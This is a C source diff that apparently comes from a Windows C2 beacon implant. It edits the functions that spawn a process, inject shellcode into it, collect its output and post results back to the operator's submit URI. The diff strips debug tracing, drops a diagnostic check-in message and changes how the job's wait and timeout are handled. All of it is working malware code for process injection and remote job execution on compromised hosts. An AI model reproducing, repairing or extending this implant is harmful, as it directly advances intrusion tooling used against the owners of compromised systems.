@@ -14,8 +14,6 @@
 #include "inlinecommon.h"
 #include <WinSock2.h>
 #include "jobs.h"
-#include "x86trace.h"
-#include "channel.h"
 
 /* inject some shellcode... enclosed stuff is the shellcode y0 */
 void command_inject_pid(char * buffer, int length, BOOL x86) {
@@ -225,7 +223,6 @@ void command_inject_pid_ping(char * buffer, int length, void(*cb)(char * buffer,
 }
 
 void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellcode, DWORD slen, char * parameter, DWORD plen, char * description, DWORD dlen, BOOL x86, BOOL ignoreToken) {
-	x86_bc("2");
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	SECURITY_ATTRIBUTES sa;
@@ -245,9 +242,7 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	sa.bInheritHandle = TRUE;
 
 	/* we're going to setup an stdout pipe only */
-	x86_bc("3");
 	CreatePipe(&read_stdout, &newstdout, &sa, 1024 * 1024);
-	x86_bc("4");
 
 	/* further process our startup info data structure */
 	GetStartupInfo(&si);
@@ -263,34 +258,15 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 		return;
 	}
 
-	{
-		char line[80];
-		_snprintf(line, sizeof(line), "spawn_x86=%d pid=%u target64=%d\n",
-			(int)x86, (unsigned)pi.dwProcessId, (int)is_x64_process(pi.hProcess));
-		command_shell_post(line, (int)lstrlenA(line), CALLBACK_OUTPUT, FALSE);
-		http_flush_post(setting_ptr(SETTING_SUBMITURI));
-	}
-
 	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
 	Sleep(100);
 
-	x86_bc(x86 ? "J3" : "J6");
 	/* inject into the process */
 	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, shellcode, slen, offset, parameter, plen);
-	x86_bc("K");
 
-	/* wait the user specified time for our process to complete.
-	 * PeekNamedPipe on the inherited stdout pipe can block forever if the
-	 * job process is stuck in loader/CLR (x86 EA). Wait on the process
-	 * handle instead; if it is still alive after wait, kill it so the
-	 * pipe unblocks and the beacon thread can check in. */
-	if (wait > 60000)
-		wait = 20000;
+	/* wait the user specified time for our process to complete */
 	if (wait > 0) {
-		WaitForSingleObject(pi.hProcess, wait);
-		if (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT)
-			TerminateProcess(pi.hProcess, 1);
-		pipe_try(read_stdout, 1);
+		pipe_try(read_stdout, wait);
 	}
 
 	/* track this process */
